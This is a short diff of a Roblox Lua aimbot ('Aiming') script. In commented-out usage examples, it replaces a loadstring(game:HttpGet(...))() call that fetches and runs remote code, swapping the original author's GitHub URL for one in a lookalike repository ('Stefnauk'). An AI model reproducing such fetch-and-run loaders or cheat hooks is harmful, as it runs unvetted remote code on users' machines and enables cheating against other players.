@@ -416,7 +416,7 @@ return Aiming
 
 --[[
 -- // Load Aiming Module
-local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/Stefanuk12/ROBLOX/master/Universal/Aiming/Module.lua"))()
+local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/uwuvik/Stefnauk/main/Module"))()
 
 -- // Hook
 local __namecall
@@ -445,7 +445,7 @@ end)
 
 --[[
 -- // Load Aiming Module
-local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/Stefanuk12/ROBLOX/master/Universal/Aiming/Module.lua"))()
+local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/uwuvik/Stefnauk/main/Module"))()
 
 -- // Hook
 local __index
